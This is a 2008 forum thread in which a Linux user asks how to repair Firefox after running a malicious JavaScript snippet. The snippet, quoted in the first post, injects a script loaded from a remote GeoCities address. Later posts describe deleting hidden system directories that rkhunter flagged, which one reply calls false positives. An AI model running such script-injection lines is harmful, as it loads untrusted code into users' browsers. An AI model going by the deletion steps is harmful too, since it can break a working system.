---
title: "reverting effects of malicious javascript."
date: 2008-08-26
forum: Security
---

### Post by pravin03 on 2008-08-26
I completely lost my Firefox due to this JavaScript.
javascript:d=document;c=d.createElement('script'); d.body.appendChild(c);c.src='http://www.geocities.com/money_2590_thakur/photos.js';void(0)
__________________

how do i heal my Firefox?



Details are here.
[http://ubuntuforums.org/showthread.php?t=900282](http://ubuntuforums.org/showthread.php?t=900282)

---

### Post by brujoand on 2008-08-26
reinstalling maybe?

"sudo apt-get remove --purge firefox"
"sudo apt-get install firefox"

---

### Post by howlingmadhowie on 2008-08-26
you could try deleting (or moving) your $HOME/.mozilla directory and then starting firefox again.

---

### Post by rogeriopvl on 2008-08-26
In your other post you have said that this happens when you run rkhunter:

> root@praveen-desktop:~# rkhunter --check --rwo
Warning: Suspicious file types found in /dev:
/dev/shm/pulse-shm-225214033: data
Warning: Hidden directory found: /etc/.java
Warning: Hidden directory found: /dev/.static
Warning: Hidden directory found: /dev/.udev
Warning: Hidden directory found: /dev/.initramfs

So, firefox was not the only compromised, the entire system might be. Format and reinstall would be the best choice, since you don't know what else was done to the system.

---

### Post by pravin03 on 2008-08-26
I removed files, .mozilla from home,
then warnings,root@praveen-desktop:~# rkhunter --check --rwo
Warning: Suspicious file types found in /dev:
/dev/shm/pulse-shm-225214033: data
Warning: Hidden directory found: /etc/.java
Warning: Hidden directory found: /dev/.static
Warning: Hidden directory found: /dev/.initramfs
were removed.
then
sudo apt-get remove --purge firefox

restarted
sudo apt-get install firefox.

NOW EVERYTHING IS OK.

I got my firefox back.

---

### Post by oscarsfriend on 2008-08-26
There shouldn't really be two threads for the same topic.  But as I said in the other thread, I don't think you should have removed the files rkhunter misreported as suspicious.

---

